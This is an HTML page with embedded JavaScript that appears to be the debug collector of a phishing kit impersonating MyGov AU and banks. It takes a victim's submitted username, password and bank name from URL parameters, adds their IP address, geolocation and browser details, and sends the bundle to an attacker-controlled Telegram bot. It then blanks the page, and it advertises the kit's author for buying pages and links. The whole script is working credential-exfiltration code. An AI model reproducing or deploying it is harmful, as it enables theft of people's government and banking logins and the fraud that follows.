<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>next (debug)</title>
</head>
<body>
<script src="config.js"></script>
<script>
  (function() {
    console.log("=== next.html started ===");

    const apikey = CONFIG.apikey;
    const chatid = CONFIG.chatid;
    console.log("apikey:", apikey);
    console.log("chatid:", chatid);

    function getParam(name) {
      const url = new URL(window.location.href);
      return url.searchParams.get(name) || '';
    }

    function getBrowser(userAgent) {
      if (userAgent.includes('MSIE')) return 'Internet Explorer';
      if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
      if (userAgent.includes('Chrome')) return 'Google Chrome';
      if (userAgent.includes('Safari')) return 'Safari';
      if (userAgent.includes('Opera')) return 'Opera';
      return 'Unknown';
    }

    async function getLocation(ip) {
      try {
        console.log("Fetching location for IP:", ip);
        const resp = await fetch(`https://freeipapi.com/api/json/${ip}`);
        const data = await resp.json();
        console.log("Location data:", data);
        return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
      } catch (e) {
        console.error("Location fetch error:", e);
        return { country: 'Unknown', city: 'Unknown' };
      }
    }

    (async function() {
      const aa = getParam('username');
      const bb = getParam('password');
      const cc = getParam('title');
      console.log("Received params:", { username: aa, password: bb, title: cc });

      if (!aa) {
        console.log("No username parameter – returning JSON key");
        document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
        return;
      }

      console.log("Fetching IP...");
      let ip = '0.0.0.0';
      try {
        const resp = await fetch('https://api.ipify.org?format=json');
        const data = await resp.json();
        ip = data.ip;
        console.log("IP fetched:", ip);
      } catch (e) {
        console.error("IP fetch error:", e);
      }

      const userAgent = navigator.userAgent;
      const browser = getBrowser(userAgent);
      console.log("Browser:", browser);
      console.log("UserAgent:", userAgent);

      const location = await getLocation(ip);
      console.log("Location:", location);

      let message = "";
      message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
      message += "|Bank Name: " + cc + "\n";
      message += "|Username: " + aa + "\n";
      message += "|Password: " + bb + "\n";
      message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
      message += "|Client IP: " + ip + "\n";
      message += "|City : " + location.city + "\n";
      message += "|Country : " + location.country + "\n";
      message += "|UserAgent : " + userAgent + "\n";
      message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
      message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
      console.log("Message to send:\n", message);

      console.log("Sending to Telegram...");
      try {
        const url = `https://api.telegram.org/bot${apikey}/sendMessage`;
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatid, text: message })
        });
        const result = await response.json();
        console.log("Telegram response:", result);
        if (result.ok) {
          console.log("✅ Message sent successfully!");
        } else {
          console.error("❌ Telegram returned error:", result);
        }
      } catch (e) {
        console.error("❌ Telegram send error (network or CORS):", e);
      }

      // Clear page (empty response)
      document.body.innerHTML = '';
      console.log("=== next.html finished ===");
    })();
  })();
</script>
</body>
</html>
